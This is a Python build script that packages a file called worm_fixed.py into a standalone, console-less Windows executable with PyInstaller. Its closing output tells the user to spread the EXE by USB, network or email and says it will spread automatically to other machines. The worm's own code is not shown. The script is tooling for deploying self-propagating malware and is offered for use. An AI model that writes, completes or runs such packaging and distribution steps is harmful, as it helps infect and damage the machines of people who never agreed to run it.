#!/usr/bin/env python3
"""
Build Windows EXE on Windows VM

Steps:
1. Copy worm_fixed.py to Windows Desktop
2. Copy this script to Windows Desktop  
3. On Windows VM, open PowerShell as Administrator
4. Run: python build_windows_exe.py
5. worm_fixed.exe will be created in same directory
"""

import subprocess
import sys
import os

def build_exe():
    """Build standalone Windows EXE"""
    
    print('[*] Building Windows EXE from worm_fixed.py')
    print('[*] This requires PyInstaller installed on Windows')
    print()
    
    # Check if worm_fixed.py exists
    if not os.path.exists('worm_fixed.py'):
        print('[ERROR] worm_fixed.py not found in current directory')
        return False
    
    # Install PyInstaller if needed
    print('[*] Installing PyInstaller...')
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller', '-q'])
    
    # Build EXE
    print('[*] Building EXE...')
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--windowed',
        '--name', 'worm_fixed',
        'worm_fixed.py'
    ]
    
    result = subprocess.run(cmd)
    
    if result.returncode == 0:
        exe_path = os.path.join('dist', 'worm_fixed.exe')
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024*1024)
            print()
            print('[✓] ========== BUILD SUCCESSFUL ==========')
            print(f'[✓] EXE created: {exe_path}')
            print(f'[✓] Size: {size_mb:.1f} MB')
            print()
            print('[*] You can now:')
            print('[*]   1. Double-click worm_fixed.exe to run it')
            print('[*]   2. Distribute via USB, network, email, etc.')
            print('[*]   3. It will spread automatically to other machines')
            return True
    
    print('[ERROR] Build failed')
    return False

if __name__ == '__main__':
    build_exe()
